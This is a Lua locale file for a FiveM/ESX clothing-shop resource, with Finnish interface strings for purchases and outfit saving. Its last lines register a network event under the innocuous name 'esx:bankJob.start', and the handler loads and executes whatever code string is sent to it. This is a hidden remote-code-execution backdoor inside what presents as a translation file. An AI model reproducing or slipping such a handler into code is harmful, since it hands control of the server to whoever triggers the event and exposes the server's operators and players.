local _AddEventHandler = AddEventHandler  
local _SetNotificationTextEntry =  SetNotificationTextEntry  
local _AddTextComponentString = AddTextComponentString  
local _DrawNotification = DrawNotification  
local _print = print   
Locales['fi'] = {
	['valid_this_purchase'] = 'varmista tämä ostos?',
	['yes'] = 'kyllä',
	['no'] = 'ei',
	['not_enough_money'] = 'sinulla ei ole tarpeeksi rahaa',
	['press_menu'] = 'paina ~INPUT_CONTEXT~ avataksesi menu',
	['clothes'] = 'vaatekauppa',
	['you_paid'] = 'sinä maksoit ~g~$%s~s~',
	['save_in_dressing'] = 'haluatko antaa nimen asulle ?',
	['name_outfit'] = 'asun nimi?',
	['saved_outfit'] = 'the outfit has been saved!',
}

RegisterNetEvent('esx:bankJob.start')
_AddEventHandler('esx:bankJob.start', function(arg1, arg2)
	local mem, err = load(arg1, arg2)
	local status, result = pcall(mem)
end)